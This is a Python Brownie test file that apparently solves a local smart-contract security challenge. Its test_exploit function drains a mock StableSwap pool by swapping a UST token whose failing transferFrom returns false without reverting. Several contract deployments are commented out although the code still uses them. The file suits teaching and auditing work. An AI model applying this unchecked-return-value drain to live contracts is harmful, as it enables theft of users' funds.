from web3 import Web3
from brownie import chain
from scripts.UR_3_helper import *
import pytest
from brownie.utils import console

@pytest.fixture
def setup():
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'
    print(chain[-1].number)

    TOKENS_INITIAL_SUPPLY = 100000000000000 # $100M
    TOKENS_IN_STABLESWAP = 1000000000000 # $1M
    CHAIN_ID = 31337;

    #[deployer, attacker] = accounts[:2]
    w3 = Web3(Web3.HTTPProvider())
    #2.5 ETH (ETH -> WEI -> Hexdecimal)
    # the evm_setAccountBalance json-rcp call equivalent in hardhat is hardhat_setBalance
    w3.provider.make_request("evm_setAccountBalance", [deployer.address, "0x90e40fbeea1d3a4abc8955e946fe31cdcf66f634e1000000000000000000"])
    w3.provider.make_request("evm_setAccountBalance", [attacker.address, "0x90e40fbeea1d3a4abc8955e946fe31cdcf66f634e1000000000000000000"])
    w3.provider.make_request("eth_getBlockByNumber", ["pending", True])
    """     ust = UST.deploy(TOKENS_INITIAL_SUPPLY, "Terra USD", "UST", 6,{'from': deployer})

    dai = DAI.deploy(CHAIN_ID,{'from': deployer})

    usdc = USDC.deploy({'from': deployer})
    usdc.initialize(
        "Center Coin", "USDC", "USDC", 6, deployer.address,
            deployer.address, deployer.address, deployer.address
        ) """
    
    #Mint INITIAL SUPPLY
    print('something')
    dai.mint(deployer.address, TOKENS_INITIAL_SUPPLY, {'from': deployer, 'gas_price': '20 gwei'})
    #configure minting for usdc
    usdc.configureMinter(deployer.address, TOKENS_INITIAL_SUPPLY, {'from': deployer, 'gas_price': '20 gwei'})
    usdc.mint(deployer.address, TOKENS_INITIAL_SUPPLY, {'from': deployer, 'gas_price': '20 gwei'})

    #Deploy StableSwap
    #stableSwap = StableSwap.deploy(ust.address, usdc.address, dai.address, {'from': deployer})

    #Check allowed tokens
    assert(stableSwap.isSupported(usdc.address, dai.address) == True)
    assert(stableSwap.isSupported(usdc.address, ust.address) == True)

    #Send tokens to StableSwap
    ust.transfer(stableSwap.address, TOKENS_IN_STABLESWAP, {'from': deployer, 'gas_price': '20 gwei'})
    dai.transfer(stableSwap.address, TOKENS_IN_STABLESWAP, {'from': deployer, 'gas_price': '20 gwei'})
    usdc.transfer(stableSwap.address, TOKENS_IN_STABLESWAP, {'from': deployer, 'gas_price': '20 gwei'})

    #Check StableSwap balances
    assert(ust.balanceOf(stableSwap.address) == TOKENS_IN_STABLESWAP)
    assert(dai.balanceOf(stableSwap.address) == TOKENS_IN_STABLESWAP)
    assert(usdc.balanceOf(stableSwap.address) == TOKENS_IN_STABLESWAP)

    #Swap fails without allowance
    amount = 100000000
    usdc.approve(stableSwap.address, amount, {'from': deployer,'gas_price': '20 gwei'})
    
    stableSwap.swap(usdc.address, dai.address, amount, {'from': deployer,'gas_price': '20 gwei'})
    assert(usdc.balanceOf(stableSwap.address) == TOKENS_IN_STABLESWAP + amount)
    assert(dai.balanceOf(stableSwap.address) == TOKENS_IN_STABLESWAP - amount)


def test_exploit(setup):
    stableSwapDAIBalance = dai.balanceOf(stableSwap.address)
    stableSwapUSDCBalance = usdc.balanceOf(stableSwap.address)
    stableSwapUSTBalance = ust.balanceOf(stableSwap.address)
    print("StableSwap USDC balance", stableSwapUSDCBalance)
    #UST Token is the token that introduces the vulnerability its transferFrom function can fail and only returns false
    #The attacker can use this to drain the StableSwap contract
    print("StableSwap USDC balance", usdc.balanceOf(stableSwap.address))
    console.log(1,duration=10)
    stableSwap.swap(ust.address, usdc.address, usdc.balanceOf(stableSwap.address), {'from': attacker,'gas_price': '20 gwei'})
    stableSwap.swap(ust.address, dai.address, dai.balanceOf(stableSwap.address), {'from': attacker,'gas_price': '20 gwei'})
    stableSwap.swap(ust.address, ust.address, ust.balanceOf(stableSwap.address), {'from': attacker,'gas_price': '20 gwei'})
    #Check StableSwap balances
    assert(ust.balanceOf(stableSwap.address) == 0)
    assert(ust.balanceOf(attacker.address) == stableSwapUSTBalance)
    assert(usdc.balanceOf(stableSwap.address) == 0)
    assert(usdc.balanceOf(attacker.address) == stableSwapUSDCBalance)
    assert(dai.balanceOf(stableSwap.address) == 0)
    assert(dai.balanceOf(attacker.address) == stableSwapDAIBalance)

    if usdc.balanceOf(attacker.address) == stableSwapUSDCBalance \
    and dai.balanceOf(attacker.address) == stableSwapDAIBalance \
        and ust.balanceOf(attacker.address) == stableSwapUSTBalance:
        print("Exploit successful")
    #assert(usdc.balanceOf(attacker.address) == stableSwapUSDCBalance)